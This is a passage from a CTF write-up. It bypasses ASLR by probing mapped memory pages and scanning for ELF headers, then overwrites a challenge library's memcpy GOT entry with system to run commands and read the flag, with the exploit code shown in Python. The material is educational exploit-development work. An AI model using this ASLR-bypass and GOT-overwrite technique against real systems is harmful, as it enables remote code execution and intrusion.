That small gap between 0x00007f763c000000 and 0x00007f763ccaa000 screws up the binary search, of course it is still doable, but i found an easier way.

### [](#observation)Observation

We want to get the last mapped address, because that's where libraries are mapped.

For example, given those mappings for the libraries:

```
7fe3d6a1e000-7fe3d6a1f000 r--p 00000000 fe:01 1445947                    /challenge/libkylezip.so
7fe3d6a1f000-7fe3d6a20000 r-xp 00001000 fe:01 1445947                    /challenge/libkylezip.so
7fe3d6a20000-7fe3d6a21000 r--p 00002000 fe:01 1445947                    /challenge/libkylezip.so
7fe3d6a21000-7fe3d6a22000 r--p 00002000 fe:01 1445947                    /challenge/libkylezip.so
7fe3d6a22000-7fe3d6a23000 rw-p 00003000 fe:01 1445947                    /challenge/libkylezip.so
7fe3d6a23000-7fe3d6a25000 rw-p 00000000 00:00 0
7fe3d6a25000-7fe3d6a26000 r--p 00000000 fe:01 2761539                    /lib/x86_64-linux-gnu/ld-2.33.so
7fe3d6a26000-7fe3d6a4d000 r-xp 00001000 fe:01 2761539                    /lib/x86_64-linux-gnu/ld-2.33.so
7fe3d6a4d000-7fe3d6a57000 r--p 00028000 fe:01 2761539                    /lib/x86_64-linux-gnu/ld-2.33.so
7fe3d6a57000-7fe3d6a59000 r--p 00031000 fe:01 2761539                    /lib/x86_64-linux-gnu/ld-2.33.so
7fe3d6a59000-7fe3d6a5b000 rw-p 00033000 fe:01 2761539                    /lib/x86_64-linux-gnu/ld-2.33.so


```

We can search for the address `7fe3d6a5b000 - 0x1000` with this trick:

<table><thead><tr><th>address</th><th>isAddressMapped?</th></tr></thead><tbody><tr><td>0x7fe3f0000000</td><td>No</td></tr><tr><td>0x7fe3e0000000</td><td>No</td></tr><tr><td>0x7fe3d0000000</td><td>Yes</td></tr><tr><td>0x7fe3df000000</td><td>No</td></tr><tr><td>0x7fe3de000000</td><td>No</td></tr><tr><td>0x7fe3dd000000</td><td>No</td></tr><tr><td>0x7fe3dc000000</td><td>No</td></tr><tr><td>0x7fe3db000000</td><td>No</td></tr><tr><td>0x7fe3da000000</td><td>No</td></tr><tr><td>0x7fe3d9000000</td><td>No</td></tr><tr><td>0x7fe3d8000000</td><td>No</td></tr><tr><td>0x7fe3d7000000</td><td>No</td></tr><tr><td>0x7fe3d6000000</td><td>Yes</td></tr><tr><td>0x7fe3d6f00000</td><td>No</td></tr><tr><td>0x7fe3d6e00000</td><td>No</td></tr><tr><td>0x7fe3d6d00000</td><td>No</td></tr><tr><td>0x7fe3d6c00000</td><td>No</td></tr><tr><td>0x7fe3d6b00000</td><td>No</td></tr><tr><td>0x7fe3d6a00000</td><td>Yes</td></tr><tr><td>0x7fe3d6af0000</td><td>No</td></tr><tr><td>0x7fe3d6ae0000</td><td>No</td></tr><tr><td>0x7fe3d6ad0000</td><td>No</td></tr><tr><td>0x7fe3d6ac0000</td><td>No</td></tr><tr><td>0x7fe3d6ab0000</td><td>No</td></tr><tr><td>0x7fe3d6aa0000</td><td>No</td></tr><tr><td>0x7fe3d6a90000</td><td>No</td></tr><tr><td>0x7fe3d6a80000</td><td>No</td></tr><tr><td>0x7fe3d6a70000</td><td>No</td></tr><tr><td>0x7fe3d6a60000</td><td>No</td></tr><tr><td>0x7fe3d6a50000</td><td>Yes</td></tr><tr><td>0x7fe3d6a5f000</td><td>No</td></tr><tr><td>0x7fe3d6a5e000</td><td>No</td></tr><tr><td>0x7fe3d6a5d000</td><td>No</td></tr><tr><td>0x7fe3d6a5c000</td><td>No</td></tr><tr><td>0x7fe3d6a5b000</td><td>No</td></tr><tr><td>0x7fe3d6a5a000</td><td>Yes</td></tr></tbody></table>

`lastMappedPage = 0x7fe3d6a5a000`

We are bruteforcing half byte at a time, for a worst case scenario of 16*5 = 80 queries.

```
def linearFindLargest(base, increment, idstart):
    for i in range(0, 16)[::-1]:
        print (f"{base + increment*i:#x}", end='\t|\t')
        if isAddrMapped(base + increment*i, idstart+i):
            print ('Yes')
            return i*increment
        print ('No')
    raise Exception("find_largest should not fail")
  
# Find upper bound, we can't do a binary search because there are some holes which
# screw things up
lastMappedPage = leakAddr
lastMappedPage += linearFindLargest(lastMappedPage, 0x10000000, 40000)
lastMappedPage += linearFindLargest(lastMappedPage, 0x1000000, 40100)
lastMappedPage += linearFindLargest(lastMappedPage, 0x100000, 40200)
lastMappedPage += linearFindLargest(lastMappedPage, 0x10000, 40300)
lastMappedPage += linearFindLargest(lastMappedPage, 0x1000, 40400)
print (f"{lastMappedPage = :#x}")

```

[](#46-the-exploit)4.6 The exploit
----------------------------------

Finally, we know everything we need about the memory mappings, now it is just a matter of leveraging a write what where primitive into code execution.

To achieve code execution I overwrote libkayle.so's memcpy@got entry with system@libc.

### [](#get-libkayle-base)Get libkayle base

Luckily for us libc base and libkayle.so base are at a constant offset from the lastMappedPage, I didn't know that was the case so I wrote a egghunter which search for `\x7fELF` (Header of ELF executables), which in the end wasn't useful.

```
    # Scan backwards looking for b'\x7fELF'
    i = 0
    numElf = 0

    while numElf != 2:
        theAddr = lastMappedPage-0x1000*i
        hdr = readFromAddr(theAddr, 4, 40500+i)
        print(f"{i:02d}) Elf in {theAddr:#x}? {hdr.hex()}")
        if hdr == b'\x7fELF':
            numElf += 1
            print (f"found elf at {theAddr:#x}")

        if i > 70:
            print ("Exploit failed, upper bound address was wrong")
            exit(1)

        i += 1


```

### [](#overwrite-libkayles-memcpygot-and-get-rce)Overwrite libkayle's memcpy@got and get RCE

Fortunately overwriting memcpy@got with system was good enough to get the flag and claim that juicy bounty :)

```
    # exp is a CompressedFile which:
    # - writes libc.system to memcpy_got
    # - calls memcpy(cmd, 0, 0) -> system(cmd)
    cmd = b"ls;cat flag.txt;\x00"
    exp = CompressedFile(24)
    
    exp.seek((memcpy_got - OUT_ADDR)&M64)
    # out=memcpy_got
    for b in p64(libc.symbols['system']):
        exp.write(bytes([b]))
    # out=memcpy_got+8
    # memcpy(out, out-off, size)
    # system(out)
    
    in_addr_off = len(exp.content)
    exp.content += cmd
    exp.seek((IN_ADDR + in_addr_off - (memcpy_got + 8))&M64)
    exp.memcpy(0, 0) # system(cmd)
    
    uploadFile(exp.content, 123001)
    # profit
    getFile(123001)

```

[](#47-the-flag)4.7 The flag!
-----------------------------

You can find the exploit [here](https://github.com/nick0ve/how-to-bypass-aslr-on-linux-x86_64/blob/main/resources/x.py).

[![](https://github.com/nick0ve/how-to-bypass-aslr-on-linux-x86_64/raw/main/images/exploit-final.png)](https://github.com/nick0ve/how-to-bypass-aslr-on-linux-x86_64/blob/main/images/exploit-final.png)

[](#5-conclusion)5. Conclusion
------------------------------

Hope you enjoyed the writeup, if something was not clear enough don't hesitate to contact me [@nick0ve](https://twitter.com/nick0ve) :)